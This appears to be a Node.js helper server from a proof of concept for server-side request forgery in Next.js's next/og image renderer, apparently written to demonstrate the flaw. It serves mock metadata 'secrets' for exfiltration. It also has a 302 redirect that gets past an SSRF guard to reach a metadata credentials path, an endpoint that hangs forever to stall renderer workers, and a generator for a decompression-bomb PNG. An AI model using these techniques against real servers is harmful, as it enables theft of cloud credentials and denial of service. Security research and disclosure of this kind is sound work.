// A loopback "internal-only" service that stands in for something an internet-
// facing Next server must NEVER be able to reach from user input — a cloud
// metadata endpoint, an internal admin panel, a private object store, etc.
// Bound to 127.0.0.1 only. It logs every request so you can watch the SSRF land.
//
//   node internal-server.mjs         # listens on 127.0.0.1:8079
//   PORT=9000 node internal-server.mjs
//
// Endpoints:
//   /latest/meta-data/... (default) -> a per-path "secret" PNG (red/blue). The
//                                      plain SSRF + content-exfil target.
//   /redirect                       -> 302 to the LITERAL-IP form of itself.
//                                      Used to show the guard is bypassed by a
//                                      redirect and reaches an address it blocks
//                                      when given directly.
//   /hang                           -> sends headers then never finishes the
//                                      body. Shows next/og has no fetch timeout.
//   /bomb                           -> a tiny PNG file that DECLARES huge
//                                      dimensions; the renderer decodes it to
//                                      w*h*4 bytes (decode amplification).
import http from 'node:http'
import zlib from 'node:zlib'

const PORT = Number(process.env.PORT || 8079)
const BOMB_DIM = Number(process.env.BOMB_DIM || 4000) // 4000x4000 -> ~64MB decode

// --- tiny solid-color PNG encoder (so the "secret" is a real, embeddable image) ---
const CRC = (() => {
  const t = new Int32Array(256)
  for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c }
  return (b) => { let c = ~0; for (let i = 0; i < b.length; i++) c = t[(c ^ b[i]) & 0xff] ^ (c >>> 8); return ~c >>> 0 }
})()
const chunk = (type, data) => {
  const len = Buffer.alloc(4); len.writeUInt32BE(data.length, 0)
  const td = Buffer.concat([Buffer.from(type), data])
  const crc = Buffer.alloc(4); crc.writeUInt32BE(CRC(td), 0)
  return Buffer.concat([len, td, crc])
}
const solidPng = (w, h, rgb) => {
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2
  const row = Buffer.concat([Buffer.from([0]), ...Array.from({ length: w }, () => Buffer.from(rgb))])
  const raw = Buffer.concat(Array.from({ length: h }, () => row))
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))])
}

// A small PNG file that declares BOMB_DIM x BOMB_DIM but whose IDAT is a stream
// of zero-rows, built incrementally so THIS process stays tiny. It decodes to
// BOMB_DIM^2 * 4 bytes in the renderer.
function bombPng(w, h) {
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2
  const def = zlib.createDeflate()
  const parts = []; def.on('data', (d) => parts.push(d))
  const zeroRow = Buffer.alloc(1 + w * 3, 0)
  const done = new Promise((res) => def.on('end', res))
  for (let y = 0; y < h; y++) def.write(zeroRow)
  def.end()
  return done.then(() => Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ihdr), chunk('IDAT', Buffer.concat(parts)), chunk('IEND', Buffer.alloc(0))]))
}
let bombCache = null

const COLORS = { red: [220, 20, 20], blue: [20, 20, 220] }
const log = (m) => console.log(`[INTERNAL 127.0.0.1:${PORT}] ${m}`)

const server = http.createServer(async (req, res) => {
  const path = req.url || '/'

  // /redirect -> 302 to the LITERAL-IP form (the address the guard blocks directly)
  if (path.startsWith('/redirect')) {
    const to = `http://127.0.0.1:${PORT}/latest/meta-data/iam/security-credentials/admin`
    log(`>>> 302 redirect to LITERAL IP ${to} (guard-allowed host bounced here)`)
    res.statusCode = 302
    res.setHeader('location', to)
    return res.end()
  }

  // /hang -> headers then never finish (no fetch timeout in next/og => worker stuck)
  if (path.startsWith('/hang')) {
    log('>>> /hang: sent headers, will NEVER finish the body (watch the render hang)')
    res.writeHead(200, { 'content-type': 'image/png', 'content-length': '1000000' })
    res.write(Buffer.from([137, 80, 78, 71]))
    return // never res.end()
  }

  // /bomb -> tiny file, huge declared dimensions (decode amplification)
  if (path.startsWith('/bomb')) {
    bombCache = bombCache || (await bombPng(BOMB_DIM, BOMB_DIM))
    log(`>>> /bomb: served ${(bombCache.length / 1024).toFixed(1)}KB PNG declaring ${BOMB_DIM}x${BOMB_DIM} (decodes to ~${(BOMB_DIM * BOMB_DIM * 4 / 1e6).toFixed(0)}MB)`)
    res.setHeader('content-type', 'image/png')
    return res.end(bombCache)
  }

  // default: a per-path red/blue "secret" image (plain SSRF + A/B content-exfil)
  const color = path.includes('blue') ? 'blue' : 'red'
  log(`>>> reached from the Next server: ${JSON.stringify(path)} (returning ${color} "secret")`)
  res.setHeader('content-type', 'image/png')
  res.end(solidPng(200, 200, COLORS[color]))
})
server.listen(PORT, '127.0.0.1', () => {
  console.log(`internal-only service listening on http://127.0.0.1:${PORT}`)
  console.log('endpoints: /latest/meta-data/*  /redirect  /hang  /bomb')
  console.log('waiting for the Next server to fetch it (that is the SSRF)…\n')
})
